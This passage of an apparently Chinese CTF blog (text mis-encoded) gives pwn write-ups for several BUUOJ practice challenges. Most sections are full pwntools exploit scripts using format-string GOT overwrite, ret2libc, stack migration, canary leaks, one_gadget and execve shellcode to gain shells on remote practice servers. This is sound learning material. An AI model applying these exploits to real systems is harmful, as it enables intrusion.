title="0x36.wustctf2020_closed"></a>0x36.wustctf2020_closed</h2><p>â€‹    è€æœ‹å‹äº†ï¼Œ<code>closeå‡½æ•°ç»•è¿‡é—®é¢˜</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag 1&gt;&amp;0</span><br><span class="line">exec 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230309/%E5%9B%BE%E7%89%87.3qxfxue6eurk.webp"></p><p>â€‹    <code>exec 1&gt;&amp;0</code>ï¼Œå…¶ä¸­ <code>1</code> è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦ <code>stdout</code>ï¼Œ<code>0</code> è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦ <code>stdin</code>ã€‚<code>&gt;&amp;</code> ç¬¦å·è¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œè¿™æ ·åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ ‡å‡†è¾“å‡ºå°†è¢«é‡å®šå‘åˆ°ç»ˆç«¯è¾“å…¥ï¼Œä»è€Œå¯ä»¥äº¤äº’å¼åœ°è¾“å…¥æ•°æ®ã€‚<br>â€‹    åœ¨Unixæˆ–Linuxä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰3ä¸ªæ ‡å‡†æ–‡ä»¶æè¿°ç¬¦ï¼šæ ‡å‡†è¾“å…¥<code>stdin</code>ï¼Œæ ‡å‡†è¾“å‡º<code>stdout</code>å’Œæ ‡å‡†é”™è¯¯<code>stderr</code>ï¼Œåˆ†åˆ«å¯¹åº”æ–‡ä»¶æè¿°ç¬¦0ã€1å’Œ2ã€‚</p><h2 id="0x37-axb-2019-fmt32"><a href="#0x37-axb-2019-fmt32" class="headerlink" title="0x37.axb_2019_fmt32"></a>0x37.axb_2019_fmt32</h2><p><code>fmt-x86 + ret2libc3</code></p><p>â€‹    æˆ‘æ„Ÿè§‰åº”è¯¥åˆ©ç”¨<code>fmtstr_payload()</code>å‡½æ•°ï¼Œä½†æ˜¯æˆ‘è²Œä¼¼ç°åœ¨åªçŸ¥é“è¯¥å¦‚ä½•æ±‚åç§»å’Œåˆ©ç”¨åç§»<code>%n$p</code>,è¿™é“é¢˜å°±æ‹¿æ¥fmtæ¼æ´çš„å­¦ä¹ è¿›é˜¶å§ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">baaaa22-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">a1234tag-%8$p</span><br><span class="line">a1111tag-%8$p</span><br><span class="line">a123tag-%8$p</span><br><span class="line">aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">11111112-%8$p</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230310/%E5%9B%BE%E7%89%87.5qv57cen1w8w.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230310/%E5%9B%BE%E7%89%87.291zwhlpmd4w.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25116</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/58&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> + p32(printf_got) + <span class="string">b&#x27;tag_here!&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">c.sendafter(<span class="string">b&#x27;me:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;tag_here!&quot;</span>)</span><br><span class="line">printf_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&quot;THE LEAK ADDR : &quot;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libcbase = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span> +fmtstr_payload(<span class="number">8</span>,&#123;printf_got:system_addr&#125;,write_size = <span class="string">&quot;byte&quot;</span>,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># è¿™é‡Œçš„åˆ†å·&quot;;&quot;å®é™…ä¸Šæ˜¯ç”¨äºç»ˆæ­¢å…ˆå‰çš„å‘½ä»¤å¹¶æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤çš„ã€‚åœ¨è¿™é‡Œï¼Œå®ƒçš„ä½œç”¨æ˜¯ä¸ºäº†ç¡®ä¿åœ¨å‘é€/bin/sh\x00ä¹‹å‰æ²¡æœ‰å…¶ä»–å‘½ä»¤åœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…æ‰§è¡Œã€‚</span></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><mark>fmtstr_payload(offset, writes, numbwritten=0, write_size=â€˜byteâ€™)</mark><br>ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»<br>ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºéœ€è¦åˆ©ç”¨%nå†™å…¥çš„æ•°æ®ï¼Œé‡‡ç”¨å­—å…¸å½¢å¼ï¼Œæˆ‘ä»¬è¦å°†printfçš„GOTæ•°æ®æ”¹ä¸ºsystemå‡½æ•°åœ°å€ï¼Œå°±å†™æˆ{printfGOT:systemAddress}ï¼›<br>ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºå·²ç»è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°<br>ç¬¬å››ä¸ªå‚æ•°è¡¨ç¤ºå†™å…¥æ–¹å¼ï¼Œæ˜¯æŒ‰å­—èŠ‚ï¼ˆbyteï¼‰ã€æŒ‰åŒå­—èŠ‚ï¼ˆshortï¼‰è¿˜æ˜¯æŒ‰å››å­—èŠ‚ï¼ˆintï¼‰ï¼Œå¯¹åº”ç€hhnã€hnå’Œnï¼Œé»˜è®¤å€¼æ˜¯byteï¼Œå³æŒ‰hhnå†™</p></blockquote><h2 id="0x38-pwnable-start"><a href="#0x38-pwnable-start" class="headerlink" title="0x38.pwnable_start"></a>0x38.pwnable_start</h2><p><code>æ±‡ç¼– &amp; Leak addr &amp; ret2shellcode</code></p><p>â€‹    å¾ˆå®¹æ˜“é€šè¿‡æ±‡ç¼–è¯­è¨€å‘ç°ï¼Œç¬¬äºŒæ¬¡ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°æ˜¯<code>read</code>å‡½æ•°ï¼Œ<code>read(0,addr,60)</code>ï¼Œé€šè¿‡<code>cyclic</code>æˆ‘å¾—åˆ°äº†æº¢å‡ºåç§»é‡ä¸º<code>20</code>.ä½†æ˜¯æœ‰ä¸€ç§<code>æ‹”å‰‘å››é¡¾å¿ƒèŒ«ç„¶</code>çš„æ„Ÿè§‰ã€‚è™½ç„¶ä¿æŠ¤å…¨å…³ï¼Œåˆ©ç”¨<code>ret2shellcode</code>ä½†æ˜¯è¿”å›åˆ°å“ªï¼Ÿå¦‚ä½•æ‰§è¡Œï¼Ÿä¹Ÿæ²¡æœ‰åé—¨ï¼Œä¹Ÿåšä¸äº†åƒ<code>ret2libc3</code>çš„æµç¨‹ã€‚å› ä¸ºä¿æŠ¤å…¨å…³äº†ï¼Œæˆ‘è¿˜æ˜¯æ›´å€¾å‘äº<code>ret2shellcode</code>ã€‚</p><p>â€‹    è¿™é“é¢˜åº”è¯¥å±äº<code>trick</code>ï¼Œæˆ‘å®åœ¨æƒ³ä¸åˆ°å¦‚ä½•åšäº†ï¼Œå€Ÿé‰´ä¸€ä¸‹ç½‘ç»œèµ„æ–™å¢é•¿ç»éªŒå§ğŸ˜¢</p><p>â€‹    æ²¡æœ‰çœ‹å…¶ä»–å¸ˆå‚…çš„payloadå€Ÿé‰´äº†ä¸€ä¸‹æ€è·¯ï¼šåˆ©ç”¨æ ˆæº¢å‡ºï¼Œå†æ¬¡è¿”å›<code>writeå‡½æ•°</code>æŠŠæ ˆåœ°å€æ‰“å‡ºæ¥ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªæ ˆåœ°å€ï¼Œæ‰§è¡Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡å†™å…¥çš„<code>shellcode</code>ï¼Œä½†æ˜¯è¿™ä¸ªshellcodeçš„é™åˆ¶æ¡ä»¶æ˜¯ä¸èƒ½å¤ªé•¿äº†ï¼Œåªè¯»å…¥äº†60bytesã€‚</p><p>â€‹    <img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230310/%E5%9B%BE%E7%89%87.2hxt3nmdx29s.webp"></p><p>â€‹    ä¸çŸ¥é“ä¸ºä»€ä¹ˆç›´æ¥sendlineä¼šå¯¼è‡´é”™è¯¯çš„è¾“å…¥ï¼Œä½¿ç”¨è§„èŒƒçš„sendlineå°±æ²¡æœ‰é—®é¢˜èƒ½å¤Ÿæ‰“é€šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28643</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x68732f </span></span><br><span class="line"><span class="string">push 0x6e69622f </span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb </span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">offset = <span class="number">20</span></span><br><span class="line">mov_ecx_esp = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(mov_ecx_esp)</span><br><span class="line">c.sendafter(<span class="string">b&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class="line">stack_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR: &#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(stack_addr+offset) + asm(shellcode)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    æœ€åå‘ç°ï¼Œ<code>trick</code>ä¹Ÿéå¤ªéš¾ï¼Œåªæ˜¯æˆ‘çœŸçš„æ²¡æœ‰æƒ³åˆ°è·³è½¬å›æ¥æ³„éœ²æ ˆåœ°å€åœ°å€ã€‚</p><h2 id="0x39-gyctf-2020-borrowstack"><a href="#0x39-gyctf-2020-borrowstack" class="headerlink" title="0x39.gyctf_2020_borrowstack"></a>0x39.gyctf_2020_borrowstack</h2><p><code>Stack Migration x64 &amp; æ ˆæŠ¬é«˜ &amp; recv &amp; one_gadget</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29682</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/62&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_rbp = <span class="number">0x601080</span></span><br><span class="line">leave_ret =<span class="number">0x0400699</span></span><br><span class="line">ret = <span class="number">0x04004c9</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0400626</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;u want&#x27;</span>)</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(fake_rbp) + p64(leave_ret)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;now!&#x27;</span>)</span><br><span class="line">payload= p64(ret) *<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment"># ADD THE RSP </span></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.recvline()  <span class="comment"># &#x27;\n&#x27;</span></span><br><span class="line">puts_addr=u64(c.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR : &#x27;</span> +<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = libcbase + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*( <span class="number">0x60</span> + <span class="number">8</span> ) + p64(one_gadget)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230311/%E5%9B%BE%E7%89%87.kpl3ev0za1s.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230311/%E5%9B%BE%E7%89%87.5jfm8qqs5pc0.webp"></p><h2 id="0x3a-others-babystack"><a href="#0x3a-others-babystack" class="headerlink" title="0x3a.others_babystack"></a>0x3a.others_babystack</h2><p><code>canary leak &amp; ret2libc3 &amp; one_gadget &amp; recv()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/61&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29390</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/61&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0400908</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400a93</span></span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>))</span><br><span class="line"><span class="comment"># å°†canaryçš„ä½ä½è¦†ç›–ä¸º&#x27;\n&#x27;</span></span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">canary= u64(c.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;canary: &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c.recv()) <span class="comment"># &#x27;\n&#x27;</span></span><br><span class="line">puts_addr=u64(c.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = libcbase + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(one_gadget) </span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><mark>æ³¨æ„äº‹é¡¹ï¼š</mark></p><ol><li>æ ˆçš„ç‰¹æ€§ï¼šé€šå¸¸åœ¨åŒä¸€å—å†…å­˜ä¸­ï¼Œä»åœ°å€ä½ä½å¼€å§‹å¡«å……æ•°æ®ï¼Œå°±æ˜¯å…ˆå¡«å……ä½å­—èŠ‚ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œå¡«å……<code>&#39;\n&#39;</code>åˆ™ä¼šç›´æ¥è¦†ç›–canaryçš„ä½ä½<code>\X00</code><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.4pb4vdb29bwg.webp"></li><li>ç»“æŸå¾ªç¯æ‰èƒ½å¼€å§‹æ‰§è¡Œæ ˆæº¢å‡ºï¼Ÿè¿™ä¸€ç‚¹æˆ‘ä¸æ˜¯èƒ½å¤Ÿå¾ˆç†è§£ï¼Œä½†æ˜¯ä¸ç»“æŸçš„è¯æ ¹æœ¬æ²¡æœ‰åœ°å€æ‰“å°å‡ºæ¥å³æ¥æ”¶ä¸äº†ã€‚</li><li>æ³¨æ„<code>sendline()</code>çš„<code>\n</code></li></ol><h2 id="0x3b-ciscn-2019-s-9"><a href="#0x3b-ciscn-2019-s-9" class="headerlink" title="0x3b.ciscn_2019_s_9"></a>0x3b.ciscn_2019_s_9</h2><p><code>stack execution &amp; ret2shellcode &amp; Assembly</code></p><p>â€‹    åšå®Œäº†è¿™é“é¢˜ï¼Œæ„Ÿè§‰æˆ‘å¯¹æ ˆä¸Šç»“æ„ä¸æ±‡ç¼–è¯­è¨€çš„ç†è§£æ›´æ·±åˆ»äº†ä¸€äº›ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25180</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/63&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">hint = <span class="number">0x08048554</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x68732f </span></span><br><span class="line"><span class="string">push 0x6e69622f </span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb </span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = shellcode +<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x24</span>-<span class="built_in">len</span>(shellcode)) + p32(hint) </span><br><span class="line">payload += asm(<span class="string">&quot;sub esp, 40; call esp&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.6jfp6m0cd01s.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.3czyrfi48nls.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.2pndmex4burk.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.2ayx71amo6kg.webp"></p><h2 id="0x3c-picoctf-2018-shellcode"><a href="#0x3c-picoctf-2018-shellcode" class="headerlink" title="0x3c.picoctf_2018_shellcode"></a>0x3c.picoctf_2018_shellcode</h2><p><code>ret2eax &amp; not-decompilable &amp; Assembly </code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/64&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27736</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/64&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Enter a string!\n&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.1ioibj8zvz8g.webp"></p><h2 id="0x3d-ciscn-2019-es-7"><a href="#0x3d-ciscn-2019-es-7" class="headerlink" 